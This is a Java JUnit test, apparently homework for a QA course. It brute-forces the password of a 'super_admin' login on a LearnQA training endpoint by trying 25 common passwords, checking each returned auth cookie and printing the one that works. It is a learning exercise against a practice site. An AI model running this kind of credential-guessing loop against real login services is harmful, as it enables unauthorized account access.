import org.junit.jupiter.api.Test;
import io.restassured.RestAssured;
import io.restassured.response.Response;




public class HelloWorldTest {
    @Test
    public void testHelloWorld() {

        String login = "super_admin";


        String[] passwords = {
                "123456", "password", "12345678", "qwerty", "12345",
                "123456789", "football", "1234", "1234567", "baseball",
                "welcome", "1234567890", "abc123", "111111", "1qaz2wsx",
                "dragon", "master", "monkey", "letmein", "login",
                "princess", "qwertyuiop", "solo", "passw0rd", "starwars"
        };


        for (String password : passwords) {


            Response authResponse = RestAssured
                    .given()
                    .param("login", login)
                    .param("password", password)
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();


            String authCookie = authResponse.getCookie("auth_cookie");


            Response checkResponse = RestAssured
                    .given()
                    .cookie("auth_cookie", authCookie)
                    .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();


            String responseBody = checkResponse.getBody().asString();


            if (!responseBody.equals("You are NOT authorized")) {
                System.out.println("\n Задание выполнено!!!");
                System.out.println("Логин: " + login);
                System.out.println("Пароль: " + password);
                System.out.println("Ответ сервера: " + responseBody);
                return;


            }

        }

    }
}
